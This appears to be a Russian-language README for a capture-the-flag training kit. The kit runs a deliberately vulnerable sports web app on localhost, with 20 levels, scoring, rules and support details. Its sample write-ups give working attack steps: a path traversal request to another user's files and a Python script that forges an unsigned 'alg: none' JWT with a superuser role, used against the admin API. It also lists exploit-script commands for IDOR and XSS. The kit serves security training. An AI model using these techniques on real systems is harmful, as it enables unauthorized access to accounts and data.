# 🎯 Operation Shoulder Takeover - CTF Platform
## Полный комплект для проведения учений по информационной безопасности

---

## 📚 Содержание комплекта

### 1. **CTF_SCENARIO.md** - Главный сценарий атаки
   - 📖 Полная история (лор) и контекст
   - 🔍 20 уровней-этапов от разведки до полного захвата
   - 🎯 Детальные описания каждой уязвимости
   - 💡 Многоуровневые подсказки (easy, medium, hard)
   - 🛠️ Технические детали для организаторов
   - 📊 Система оценивания (500+ баллов)

### 2. **ctf_validator.py** - Система валидации флагов
   - ✅ Автоматическая проверка флагов
   - 📈 Отслеживание прогресса участников
   - 🔗 Система зависимостей между уровнями
   - 📊 Таблица лидеров и статистика
   - 💾 Экспорт результатов в JSON
   - 🎓 CLI для управления CTF

### 3. **CTF_ORGANIZER_GUIDE.md** - Руководство проведения
   - 🚀 Быстрый старт (за 30 минут)
   - 🔧 Детальные инструкции для каждой уязвимости
   - 📋 Контрольный список перед CTF
   - 🔍 Скрипты проверки каждого элемента
   - 📞 Система поддержки участников
   - 📈 Метрики успеха и анализ

### 4. **ctf_poc_exploits.py** - Примеры эксплуатации
   - 💻 Готовые скрипты для тестирования
   - 🔐 Примеры кода на Python
   - 🎯 Полная цепь атак от начала до конца
   - 📊 Утилиты для демонстрации

---

## 🚀 Быстрый старт

### Установка

```bash
# 1. Клонируйте репозиторий и перейдите в директорию
cd shoulder-to-shoulder

# 2. Подготовьте .env файл
cp .env.example .env

# 3. Отредактируйте критические значения в .env:
# ENVIRONMENT=development
# DEBUG=true
# SECRET_KEY=CHANGE_ME_GENERATE_64_RANDOM_CHARS (слабый ключ для CTF)

# 4. Запустите все сервисы
docker-compose up -d

# 5. Проверьте что всё работает
python3 ctf_validator.py --list-flags
```

### Валидация флагов

```bash
# Обучение системе управления флагами
python3 ctf_validator.py --validate "FLAG{arch_enumeration_completed_gateway_admin_service_found}"

# Получить подсказку
python3 ctf_validator.py --hint 1 --hint-level medium

# Показать все флаги
python3 ctf_validator.py --list-flags
```

### Точка отказа - Ошибки при запуске

Если вы видите ошибку при запуске, посмотрите:

```bash
# 1. Кажутся ли сервисы запущены?
docker-compose ps

# 2. Кажутся ли они здоровы?
curl http://localhost:8005/health
curl http://localhost:8000/health

# 3. Проверьте логи:
docker-compose logs gateway
docker-compose logs user_service

# 4. Перезагрузитесь:
docker-compose down -v
docker-compose up -d
```

---

## 🔍 Обзор 20 уровней CTF

| # | Название | Тип уязвимости | Сложность | Баллы |
|---|----------|----------------|-----------|-------|
| 1 | Архитектура | Reconnaissance | 🟢 Easy | 10 |
| 2 | Debug Errors | Info Disclosure | 🟢 Easy | 15 |
| 3 | Registration | Auth Bypass | 🟢 Easy | 20 |
| 4 | IDOR Profile | Privilege Escalation | 🟡 Medium | 25 |
| 5 | User Enumeration | Info Disclosure | 🟢 Easy | 15 |
| 6 | Path Traversal | Directory Traversal | 🟡 Medium | 30 |
| 7 | NATS Injection | SSRF/Message Injection | 🔴 Hard | 35 |
| 8 | JWT Manipulation | Cryptography | 🔴 Hard | 40 |
| 9 | Race Condition | Business Logic | 🔴 Hard | 35 |
| 10 | Admin Panel | Privilege Escalation | 🔴 Hard | 40 |
| 11 | Event Modification | Business Logic | 🟡 Medium | 35 |
| 12 | Privacy Breach | Data Leakage | 🟡 Medium | 30 |
| 13 | Badge Injection | Message Injection | 🔴 Hard | 40 |
| 14 | SQL Injection | Database Injection | 🔴 Hard | 45 |
| 15 | SSTI | Template Injection | 🔴 Hard | 50 |
| 16 | Deserialization | Insecure Deserialization | 🔴 Hard | 50 |
| 17 | Backup Leak | Exposed Credentials | 🟡 Medium | 45 |
| 18 | Internal Access | Lateral Movement | 🔴 Hard | 40 |
| 19 | XSS Attack | Cross-Site Scripting | 🟡 Medium | 35 |
| 20 | Full Compromise | Complete | 🔴 Hard | 100 |

**TOTAL: 500+ баллов**

---

## 🛠️ Требуемые инструменты

### Базовые (все используют):
- `curl` или `wget` - тестирование API
- `Postman` или `Insomnia` - GUI для REST запросов
- `jq` - парсинг JSON
- Любой browser с DevTools

### Продвинутые (для hard режима):
- `Burp Suite Community` - перехват и анализ запросов
- `Apache JMeter` - load testing и race conditions
- `SQLMap` - SQL injection testing
- `natas-py` - работа с NATS message bus
- `python3 + jwt, requests` - скриптинг атак
- `john` или `hashcat` - крекинг хешей паролей

### Установка зависимостей

```bash
# Python
pip install pyjwt requests nats-py

# If on Linux/Mac:
apt-get install jq  # or brew install jq on Mac
curl https://getcomposer.org/installer | php  # if needed

# Optional tools:
# Burp Suite - скачать отсюда: https://portswigger.net/burp
# JMeter - скачать отсюда: https://jmeter.apache.org/
```

---

## 📊 Система оценивания

### Базовые баллы
- Каждый флаг даёт определённое количество баллов
- Сложные флаги (🔴 Hard) дают больше баллов
- Зависимые флаги можно решить только после предыдущих

### Бонусы (опционально)
- **First Blood:** +50 баллов за первый решивший этап
- **Speed Bonus:** +10 баллов если решено в первый час
- **Teaching Bonus:** +25 баллов за написание write-up для других

### Штрафы (если нужны)
- Срыв сервиса: -100 баллов
- Попытка читерства: Дисквалификация

---

## 🎓 Правила проведения

### Разрешено:
- ✅ Использовать любые инструменты из доступных
- ✅ Работать в команде (предпочтительно)
- ✅ Запрашивать подсказки (с штрафом баллов или без)
- ✅ Смотреть документацию и Stack Overflow
- ✅ Писать свои скрипты и инструменты

### Запрещено:
- ❌ Брать готовые write-up'ы с интернета
- ❌ Делиться флагами с другими командами
- ❌ Атаковать внешние сервисы (только CTF инстанс)
- ❌ Использовать недоступные инструменты (например, полный Burp Pro если не установлен)
- ❌ Срывать общее окружение для других

---

## 💡 Примеры использования POC скриптов

### Готовые эксплуатации

```bash
# 1. Зарегистрироваться как обычный пользователь
python3 ctf_poc_exploits.py --register

# 2. Перечислить всех пользователей (enumeration)
python3 ctf_poc_exploits.py --enum

# 3. Найти admin через IDOR
python3 ctf_poc_exploits.py --idor

# 4. Протестировать path traversal
python3 ctf_poc_exploits.py --traversal

# 5. Создать JWT token с none algorithm
python3 ctf_poc_exploits.py --jwt

# 6. Сгенерировать XSS payload
python3 ctf_poc_exploits.py --xss

# 7. Запустить полную цепь атак
python3 ctf_poc_exploits.py --full --verbose
```

---

## 📈 Отслеживание прогресса

### Для участников
```bash
# Проверить какие флаги вы решили
python3 ctf_validator.py --list-flags | grep -i "medium"

# Получить подсказку
python3 ctf_validator.py --hint 5 --hint-level easy

# Сабмитить флаг
python3 ctf_validator.py --validate "FLAG{...}"
```

### Для организаторов
```bash
# Экспортировать результаты для таблицы лидеров
python3 ctf_validator.py --export results.json

# Проверить что все уязвимости доступны
bash ctf_sanity_check.sh

# Посмотреть логи всех попыток (требует setup логирования)
tail -f docker-compose.logs | grep -i "flag\|unauthorized\|admin"
```

---

## 🔒 Безопасность при проведении CTF

### Изоляция окружения

```bash
# Используйте отдельный сервер/виртуальную машину
# Не запускайте на production серверах!

# Docker контейнеры должны быть изолированы:
# - Не давайте доступ к root Docker socket
# - Используйте отдельную Docker network
# - Установите ressource limits:

docker-compose.yml:
services:
  user_service:
    deploy:
      resources:
        limits:
          cpus: '1'
          memory: 512M
```

### Логирование и мониторинг

```python
# Добавьте логирование в каждый сервис:
logging.basicConfig(
    filename='/var/log/ctf.log',
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - [%(levelname)s] - %(message)s'
)

# Мониторьте подозрительную деятельность:
# - Множество failed login попыток
# - Access к admin endpoints
# - Большие загрузки файлов
# - Изменения на важных данных
```

### После CTF

```bash
# Очистите все данные тестирования:
docker-compose down -v

# Восстановите production конфигурацию:
git checkout .env
ENVIRONMENT=production docker-compose up -d

# Проверьте что всё работает нормально:
curl http://localhost:8005/health
# Должно показать status: "ok"
```

---

## 📝 Примеры write-up'ов

### Уровень 1: Разведки

**Решение:**
```bash
# Обращаемся к /health endpoint каждого сервиса
curl http://localhost:8005/health
curl http://localhost:8000/health
curl http://localhost:8001/health
curl http://localhost:8002/health
...

# Флаг находится в response:
# FLAG{arch_enumeration_completed_gateway_admin_service_found}
```

### Уровень 6: Path Traversal

**Решение:**
```bash
# 1. Сначала получаем файл своего профиля
TOKEN="..."
curl "http://localhost:8005/api/v1/media/avatar/my-id/profile.jpg" \
  -H "Authorization: Bearer $TOKEN"

# 2. Теперь используем path traversal чтобы получить файл админа
# Путь файла: avatar/{owner_id}/{file_name}
# Используя ../../ мы можем трансверсировать в другой owner_id

curl "http://localhost:8005/api/v1/media/avatar/dummy/../admin-id/admin_photo.jpg"

# 3. Если успешно получили файл админа:
# FLAG{path_traversal_admin_photo_accessed_contained_bank_account}
```

### Уровень 8: JWT Manipulation

**Решение:**
```bash
# 1. Декодируем существующий токен в jwt.io или локально:
python3 << 'EOF'
import jwt
token = "eyJhbGc..."
decoded = jwt.decode(token, options={"verify_signature": False})
print(decoded)
EOF

# 2. Создаём токен с algorithm: none
python3 << 'EOF'
import json
import base64

def b64encode(data):
    return base64.urlsafe_b64encode(
        json.dumps(data).encode()
    ).rstrip(b'=').decode()

header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "admin-id", "role": "superuser"}

token = f"{b64encode(header)}.{b64encode(payload)}."
print(token)
EOF

# 3. Используем токен:
curl -H "Authorization: Bearer $MODIFIED_TOKEN" \
  http://localhost:8005/api/v1/admin/users
```

---

## 🆘 Помощь и поддержка

### Часто задаваемые вопросы

**Q: Я получаю "Connection refused" при попытке подключиться к API**
A: Убедитесь что docker-compose запущен и все сервисы здоровы: `docker-compose ps`

**Q: Флаг не принимается хотя я уверен что он правильный**
A: Проверьте что вы используете точный формат `FLAG{content_exactly_as_is}`

**Q: Я не могу подключиться к NATS для Stage 7**
A: Установите nats-cli: `brew install nats-io/nats-tools/nats-cli`

**Q: POC скрипт не работает**
A: Убедитесь что у вас установлены все зависимости: `pip install -r requirements.txt`

### Контакты поддержки

- 💬 **Discord:** [ссылка на сервер]
- 📧 **Email:** ctf@s2s-sports.local
- 🐙 **GitHub Issues:** [ссылка на Issues]

---

## 📚 Дополнительные материалы

### Рекомендуемое чтение:
- [OWASP Top 10](https://owasp.org/Top10/)
- [CWE Top 25](https://cwe.mitre.org/top25/)
- [HackTricks](https://book.hacktricks.xyz/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)

### Полезные курсы:
- TryHackMe CTF путь
- HackTheBox для практики
- PentesterLab за специфичные вульны

### Коммьюнити:
- r/ctf на Reddit
- CTFtime.org - парад реальных CTF
- Местные инфосек meetup'ы

---

## 📄 Лицензия

Этот CTF сценарий и материалы созданы исключительно в образовательных целях.
Используйте только на авторизованных серверах и окружениях!

---

## ✅ Чек-лист перед запуском CTF

- [ ] Все файлы скачаны и находятся в одной директории
- [ ] Docker и docker-compose установлены
- [ ] .env файл обновлён с правильными значениями
- [ ] Все сервисы запущены и здоровы
- [ ] Тестовые пользователи созданы
- [ ] Все флаги встроены в систему
- [ ] Валидатор работает: `python3 ctf_validator.py --list-flags`
- [ ] POC скрипты работают: `python3 ctf_poc_exploits.py --register`
- [ ] Документация прочитана участниками
- [ ] Система поддержки готова (Discord/Email/Slack)
- [ ] Time limit установлен
- [ ] Таблица лидеров подготовлена
- [ ] Backup данных создан перед стартом

---

**Готовы к учениям? Удачи всем участникам! 🎯🔐**

*Операция Shoulder Takeover — начало!*
